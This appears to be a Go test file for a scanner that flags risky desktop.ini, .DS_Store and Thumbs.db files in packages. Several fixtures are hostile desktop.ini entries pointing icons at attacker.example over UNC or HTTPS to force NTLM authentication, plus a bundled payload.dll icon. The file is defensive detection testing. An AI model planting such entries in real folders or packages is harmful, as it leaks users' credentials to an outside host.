package installsurface

import "testing"

// findHook returns the hook whose Name matches, or nil.
func findHook(s Surface, name string) *Hook {
	for i := range s.Hooks {
		if s.Hooks[i].Name == name {
			return &s.Hooks[i]
		}
	}
	return nil
}

func TestAnalyzeMetadataSurface_DesktopINI(t *testing.T) {
	cases := []struct {
		name     string
		content  string
		wantCaps []Capability // capabilities the hook must have
		noCaps   []Capability // capabilities the hook must NOT have
		wantSink bool         // expect an SMB/NTLM forced-auth sink
	}{
		{
			name:    "bare leftover — provenance only",
			content: "[.ShellClassInfo]\nConfirmFileOp=0\n",
			noCaps:  []Capability{CapNetwork, CapCredentials, CapExec},
		},
		{
			name:    "empty file — provenance only",
			content: "",
			noCaps:  []Capability{CapNetwork, CapCredentials, CapExec},
		},
		{
			name:     "UNC IconResource — forced auth",
			content:  "[.ShellClassInfo]\nIconResource=\\\\attacker.example\\share\\x.ico,0\n",
			wantCaps: []Capability{CapNetwork, CapCredentials},
			wantSink: true,
		},
		{
			name:     "remote URL IconFile — forced auth",
			content:  "[.ShellClassInfo]\nIconFile=https://attacker.example/x.ico\n",
			wantCaps: []Capability{CapNetwork, CapCredentials},
			wantSink: true,
		},
		{
			name:     "CLSID redirect — exec-adjacent",
			content:  "[.ShellClassInfo]\nCLSID={20D04FE0-3AEA-1069-A2D8-08002B30309D}\n",
			wantCaps: []Capability{CapExec},
			noCaps:   []Capability{CapNetwork, CapCredentials},
		},
		{
			name:     "bundled executable icon — exec",
			content:  "[.ShellClassInfo]\nIconResource=payload.dll,0\n",
			wantCaps: []Capability{CapExec},
			noCaps:   []Capability{CapNetwork},
		},
		{
			name:    "system icon lib (env-rooted) — benign",
			content: "[.ShellClassInfo]\nIconResource=%SystemRoot%\\system32\\SHELL32.dll,3\n",
			noCaps:  []Capability{CapNetwork, CapCredentials, CapExec},
		},
		{
			name:    "bare system icon lib — benign",
			content: "[.ShellClassInfo]\nIconResource=shell32.dll,4\n",
			noCaps:  []Capability{CapNetwork, CapCredentials, CapExec},
		},
		{
			name:    "drive-rooted local icon — benign",
			content: "[.ShellClassInfo]\nIconFile=C:\\Windows\\system32\\imageres.dll\n",
			noCaps:  []Capability{CapNetwork, CapCredentials, CapExec},
		},
		{
			name:    "extended-length local path — not remote",
			content: "[.ShellClassInfo]\nIconResource=\\\\?\\C:\\pkg\\folder.ico,0\n",
			noCaps:  []Capability{CapNetwork, CapCredentials},
		},
		{
			name:     "extended UNC path — remote",
			content:  "[.ShellClassInfo]\nIconResource=\\\\?\\UNC\\attacker.example\\share\\x.ico,0\n",
			wantCaps: []Capability{CapNetwork, CapCredentials},
			wantSink: true,
		},
		{
			name:    "directive outside ShellClassInfo — ignored",
			content: "[SomethingElse]\nIconResource=\\\\attacker.example\\share\\x.ico,0\n",
			noCaps:  []Capability{CapNetwork, CapCredentials, CapExec},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			s := AnalyzeMetadataSurface(map[string]string{"desktop.ini": tc.content})
			h := findHook(s, "desktop.ini")
			if h == nil {
				t.Fatalf("no hook produced for desktop.ini")
			}
			for _, c := range tc.wantCaps {
				if !h.HasCap(c) {
					t.Errorf("missing capability %q; caps=%v", c, h.Caps)
				}
			}
			for _, c := range tc.noCaps {
				if h.HasCap(c) {
					t.Errorf("unexpected capability %q; caps=%v", c, h.Caps)
				}
			}
			gotSink := false
			for _, sk := range h.Sinks {
				if sk.Name == "SMB/NTLM (forced authentication)" {
					gotSink = true
				}
			}
			if gotSink != tc.wantSink {
				t.Errorf("forced-auth sink present = %v, want %v (sinks=%v)", gotSink, tc.wantSink, h.Sinks)
			}
		})
	}
}

func TestAnalyzeMetadataSurface_Disclosure(t *testing.T) {
	for _, name := range []string{".DS_Store", "Thumbs.db", "ehthumbs.db", "vendor/pkg/.DS_Store"} {
		t.Run(name, func(t *testing.T) {
			s := AnalyzeMetadataSurface(map[string]string{name: "\x00\x01binary"})
			h := findHook(s, name)
			if h == nil {
				t.Fatalf("no disclosure hook for %q", name)
			}
			if len(h.Caps) != 0 {
				t.Errorf("disclosure hook should carry no capabilities, got %v", h.Caps)
			}
			if len(h.Sinks) != 0 {
				t.Errorf("disclosure hook should carry no sinks, got %v", h.Sinks)
			}
		})
	}
}

func TestAnalyzeMetadataSurface_IgnoresNonMetadata(t *testing.T) {
	s := AnalyzeMetadataSurface(map[string]string{
		"README.md":       "# hello",
		"src/desktop.go":  "package src",
		"config.ini":      "[section]\nk=v",
		"desktop.ini.bak": "[.ShellClassInfo]\nIconResource=\\\\x\\y\\z.ico,0",
	})
	if len(s.Hooks) != 0 {
		t.Fatalf("expected no hooks for non-metadata inputs, got %d: %+v", len(s.Hooks), s.Hooks)
	}
}

func TestAnalyzeMetadataSurface_DeterministicOrder(t *testing.T) {
	in := map[string]string{
		"z/desktop.ini": "[.ShellClassInfo]\n",
		"a/Thumbs.db":   "bin",
		"m/.DS_Store":   "bin",
	}
	got1 := AnalyzeMetadataSurface(in)
	got2 := AnalyzeMetadataSurface(in)
	if len(got1.Hooks) != 3 {
		t.Fatalf("want 3 hooks, got %d", len(got1.Hooks))
	}
	for i := range got1.Hooks {
		if got1.Hooks[i].Name != got2.Hooks[i].Name {
			t.Fatalf("non-deterministic order at %d: %q vs %q", i, got1.Hooks[i].Name, got2.Hooks[i].Name)
		}
	}
	// sorted: a/Thumbs.db, m/.DS_Store, z/desktop.ini
	want := []string{"a/Thumbs.db", "m/.DS_Store", "z/desktop.ini"}
	for i, w := range want {
		if got1.Hooks[i].Name != w {
			t.Errorf("hook[%d] = %q, want %q", i, got1.Hooks[i].Name, w)
		}
	}
}

func TestIsMetadataFile(t *testing.T) {
	yes := []string{"desktop.ini", "build/Desktop.INI", ".DS_Store", "a/b/Thumbs.db", "ehthumbs.db"}
	no := []string{"README.md", "config.ini", "desktop.go", "thumbs.dbx", "notes.ds_store.txt"}
	for _, p := range yes {
		if !IsMetadataFile(p) {
			t.Errorf("IsMetadataFile(%q) = false, want true", p)
		}
	}
	for _, p := range no {
		if IsMetadataFile(p) {
			t.Errorf("IsMetadataFile(%q) = true, want false", p)
		}
	}
}
